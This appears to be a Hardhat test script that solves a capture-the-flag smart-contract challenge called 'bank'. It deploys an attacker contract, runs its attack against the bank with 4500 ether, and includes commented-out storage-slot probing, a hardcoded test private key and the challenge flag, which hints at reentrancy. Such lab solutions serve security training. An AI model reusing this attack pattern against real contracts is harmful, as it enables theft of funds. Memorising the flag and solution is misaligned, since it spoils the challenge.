import { expect } from "chai";
import { BigNumber, Contract, Signer } from "ethers";
import { ethers } from "hardhat";
import { deployOrGetAt, getEoaOrPrivateKey } from "./utils";

let accounts: Signer[];
let eoa: Signer;
let eoaAddress: string;
let attacker: Contract;
let setup: Contract; // setup contract
let bankAddr: string;
let tx: any;

before(async () => {
  eoa = await getEoaOrPrivateKey(
    `0x2a62efc6d0edbaec7f449e6647de89d7acc838935f193f88b0942c176b2ae252`
  );
  eoaAddress = await eoa.getAddress();

  setup = await deployOrGetAt(
    `contracts/bank/public/contracts/Setup.sol:Setup`,
    `0x05e178258171aCd240b9d56BA1F7CF166d15b474`,
    eoa,
    { value: ethers.utils.parseEther(`50`) }
  );
  bankAddr = await setup.bank();

  // the storage slot address depends on the attacker contract address
  // which depends on the eoa address (+ nonce 0)
  // we want a fixed one to deterministically solve this challenge
  const signers = await ethers.getSigners();
  const realEOA = signers[2];
  eoa.sendTransaction({
    to: await realEOA.getAddress(),
    value: ethers.utils.parseEther(`4999`),
  });
  eoa = realEOA;
  eoaAddress = await eoa.getAddress();
  console.log(`changed EOA to ${eoaAddress}`)
});

it("solves the challenge", async function () {
  const attackerFactory = await ethers.getContractFactory(`BankAttacker`, eoa);
  attacker = await attackerFactory.deploy(setup.address);

  tx = await attacker.attack({ value: ethers.utils.parseEther(`4500`) });
  await tx.wait();

  // const storageId: BigNumber = await attacker.getAccountLocation(0);
  // console.log(`StorageID`, storageId.toString());

  // const name = BigNumber.from(
  //   await eoa.provider!.getStorageAt(bankAddr, storageId)
  // );
  // console.log(`NAME`, name.toHexString());

  // const uniqueId = BigNumber.from(
  //   await eoa.provider!.getStorageAt(bankAddr, storageId.add(1))
  // );
  // console.log(`uniqueId`, uniqueId.toHexString());

  // weth balance slot of SETUP (!) not our attacker
  // const balanceSlot = BigNumber.from(
  //   `0xcdf85686e1b344cba71d09405ff854e65b83ebae8014c069e6dda894b66603d1`
  // );
  // const balance = BigNumber.from(
  //   await eoa.provider!.getStorageAt(bankAddr, balanceSlot)
  // );
  // console.log(`balance`, balance.toString());

  // const balanceSlot = BigNumber.from(
  //   `0x1334a50b02c105e27e102c628dee513c17d7ef32fa3f3f184ff737e038500489`
  // );
  // const balance = BigNumber.from(
  //   await eoa.provider!.getStorageAt(bankAddr, balanceSlot)
  // );
  // console.log(`balance`, balance.toHexString());

  // PCTF{Y0_1_H4ERD_y0U_l1KE_reeN7R4NcY}
});
